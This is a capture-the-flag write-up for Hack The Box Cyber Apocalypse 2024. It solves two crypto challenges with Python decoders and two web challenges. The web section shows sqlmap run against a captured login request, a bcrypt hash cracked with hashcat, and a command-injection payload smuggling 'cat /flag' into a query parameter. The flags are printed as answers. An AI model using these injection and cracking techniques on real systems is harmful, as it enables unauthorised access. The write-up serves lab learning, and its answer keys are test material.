# Cyber Apocalypse 2024: Hacker Royale Write-up

<img src="https://ctf.hackthebox.com/storage/ctf/banners/DREwio2TXADvSLScO07rux2olm6vjUoEXQPPAKBC.jpg" width="500" height="288">

## Crypto

### Task - Primary Knowledge

![image](https://github.com/zer00d4y/writeups/assets/128820441/c7a2c26a-40e2-448d-a40c-e71cf8661756)

Decoder

    import math
    from Crypto.Util.number import long_to_bytes
    
    def decrypt(c, n, e):
        phi = (n - 1) // 2
        d = pow(e, -1, phi)
        m = pow(c, d, n)
        return long_to_bytes(m)
    
    n = 144595784022187052238125262458232959109987136704231245881870735843030914418780422519197073054193003090872912033596512666042758783502695953159051463566278382720140120749528617388336646147072604310690631290350467553484062369903150007357049541933018919332888376075574412714397536728967816658337874664379646535347
    e = 65537
    c = 15114190905253542247495696649766224943647565245575793033722173362381895081574269185793855569028304967185492350704248662115269163914175084627211079781200695659317523835901228170250632843476020488370822347715086086989906717932813405479321939826364601353394090531331666739056025477042690259429336665430591623215
    
    decrypted_message = decrypt(c, n, e)
    print(decrypted_message)

FLAG:

    HTB{0h_d4mn_4ny7h1ng_r41s3d_t0_0_1s_1!!!}

### Task - Makeshift

![image](https://github.com/zer00d4y/writeups/assets/128820441/8775b769-6274-43c6-a9b5-6ec4cb68d384)

Decoder

    def decode_flag(encoded_flag):
        decoded_flag = ''
        for i in range(0, len(encoded_flag), 3):
            decoded_flag += encoded_flag[i+2]
            decoded_flag += encoded_flag[i]
            decoded_flag += encoded_flag[i+1]
        return decoded_flag[::-1]
    
    encoded_flag = "!?}De!e3d_5n_nipaOw_3eTR3bt4{_THB"
    decoded_flag = decode_flag(encoded_flag)
    print(decoded_flag)

FLAG:

    HTB{4_b3tTeR_w3apOn_i5_n3edeD!?!}

## WEB

### Task - KORP Terminal

We can see the web authentication interface.

![image](https://github.com/user-attachments/assets/550917ed-ef90-4685-914e-09a39ef3aa0a)

Try to login and intercept the request.

Request:

    POST / HTTP/1.1
    Host: localhost:1337
    Content-Length: 27
    Cache-Control: max-age=0
    sec-ch-ua: "Chromium";v="121", "Not A(Brand";v="99"
    sec-ch-ua-mobile: ?0
    sec-ch-ua-platform: "Linux"
    Upgrade-Insecure-Requests: 1
    Origin: http://localhost:1337
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Referer: http://localhost:1337/
    Accept-Encoding: gzip, deflate, br
    Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
    Connection: close
    
    username=test*&password=test*

Now, we can save the request and test for sql injection.

### SQL-Map

`sqlmap -r request.txt --ignore-code 401`

![image](https://github.com/user-attachments/assets/2bec84ee-0b66-4245-b3e4-679979f5f7a3)



![image](https://github.com/user-attachments/assets/46b39c28-852f-4724-8fb3-2f0cdc16523f)

Hash:

    $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.

### Hashcat 

It's a bcrypt hashed password, cracking it with hashcat!

`hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt`


    $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.:password123
                                                              
    Session..........: hashcat
    Status...........: Cracked
    Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
    Hash.Target......: $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8...63yiv.
    Time.Started.....: Tue Dec 31 11:42:17 2024 (1 min, 5 secs)
    Time.Estimated...: Tue Dec 31 11:43:22 2024 (0 secs)
    Kernel.Feature...: Pure Kernel
    Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
    Guess.Queue......: 1/1 (100.00%)
    Speed.#1.........:       22 H/s (5.95ms) @ Accel:6 Loops:16 Thr:1 Vec:1
    Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
    Progress.........: 1404/14344385 (0.01%)
    Rejected.........: 0/1404 (0.00%)
    Restore.Point....: 1368/14344385 (0.01%)
    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4080-4096
    Candidate.Engine.: Device Generator
    Candidates.#1....: lacoste -> harry
    Hardware.Mon.#1..: Util: 80%

Now we have credentials for admin, login and get the flag!

### Task - TimeKORP

![image](https://github.com/user-attachments/assets/ce4af417-81f3-4f8b-b93f-3913a91b8164)

Solution:

    import requests
    
    host, port = 'localhost', 1337
    HOST = 'http://%s:%s/' % (host, port)
    
    r = requests.get(HOST, params={ 'format': "'; cat /flag || '" })
    print(r.text)

FLAG:

    HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3}
